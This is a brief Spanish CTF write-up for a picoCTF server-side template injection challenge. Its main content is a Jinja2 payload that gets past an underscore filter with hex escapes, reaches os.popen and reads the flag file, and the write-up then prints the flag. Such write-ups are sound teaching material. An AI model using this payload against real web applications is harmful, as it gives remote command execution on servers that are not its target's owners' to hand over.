## Descripción del reto


## Solución

- Nos muestra la pagina de inicio.
![[Pasted image 20251009210557.png]]

- Introduce esta inyección para vulnerar la pagina.
```
{{ config | attr('\x5f\x5fclass\x5f\x5f') | attr('\x5f\x5finit\x5f\x5f') | attr('\x5f\x5fglobals\x5f\x5f') | attr('\x5f\x5fgetitem\x5f\x5f')('os') | attr('popen')('cat flag') | attr('read')() }}
```

- De esta manera nos dará la pagina.
![[Pasted image 20251009210743.png]]

picoCTF{sst1_f1lt3r_byp4ss_a9824e27}

## Notas


## Referencia